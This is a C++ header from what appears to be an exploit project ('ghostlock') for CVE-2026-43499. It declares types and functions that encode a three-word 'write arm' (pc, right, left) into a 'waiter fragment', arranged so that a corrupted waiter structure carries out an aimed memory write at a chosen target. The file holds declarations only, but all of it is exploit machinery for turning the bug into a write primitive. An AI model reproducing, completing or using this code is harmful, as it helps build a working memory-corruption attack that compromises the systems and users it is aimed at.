#pragma once
/** @file memory/write_encoder.hpp
 *  Turning a write request into the words a waiter fragment carries.
 *
 *  The arm is three words: where the fragment points, and the two side fields
 *  that have to be zero for the write to land where it is aimed. A value write
 *  aims at the value, a leaf write aims at the target itself, and the width as
 *  well as the field offsets come from the target profile rather than from here.
 *
 *  Encoding is all-or-nothing: every field is checked against the fragment
 *  before a single byte is written, so a fragment that cannot hold the arm is
 *  left exactly as it was. The old tree kept one fragment size as a header
 *  constant; nothing of that class is spelled here.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/memory/write_request.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    /** Where the three arm words sit inside the fragment, from the profile. */
    struct WaiterFieldOffsets final {
        std::size_t pc = 0U;
        std::size_t right = 0U;
        std::size_t left = 0U;
    };

    /** The words themselves, at the target's pointer width. */
    struct WriteArm final {
        std::uint64_t pc = 0U;
        std::uint64_t right = 0U;
        std::uint64_t left = 0U;
    };

    /** Why an arm was refused. Names come from the single table (UML 3.2). */
    enum class EncodeVerdict : unsigned char {
        Ok = 0,
        /** The fragment cannot hold every field of the arm. */
        FragmentTooSmall = 1,
        /** The width is not one this build can encode. */
        WidthInvalid = 2,
    };

    [[nodiscard]] constexpr const char *encode_verdict_name(EncodeVerdict verdict) noexcept {
        switch (verdict) {
            case EncodeVerdict::Ok: return "ok";
            case EncodeVerdict::FragmentTooSmall: return "budget-exceeded";
            case EncodeVerdict::WidthInvalid: return "width-mismatch";
        }
        return "unknown";
    }

    /** The arm a request produces. A value write points the fragment at value;
     *  a leaf write points it one pointer width before the target, which is what
     *  makes the write land on the field rather than beside it. Both side fields
     *  are zero in either case. */
    [[nodiscard]] WriteArm arm_for(const WriteRequest &request, std::uint64_t value,
                                   std::size_t pointer_bytes) noexcept;

    /** Write the arm into the fragment at the declared offsets. Nothing is
     *  written unless every field fits. */
    [[nodiscard]] EncodeVerdict encode_waiter_arm(std::uint8_t *fragment,

                                                  std::size_t fragment_size,

                                                  const WaiterFieldOffsets &offsets,

                                                  const WriteArm &arm,

                                                  std::size_t pointer_bytes) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
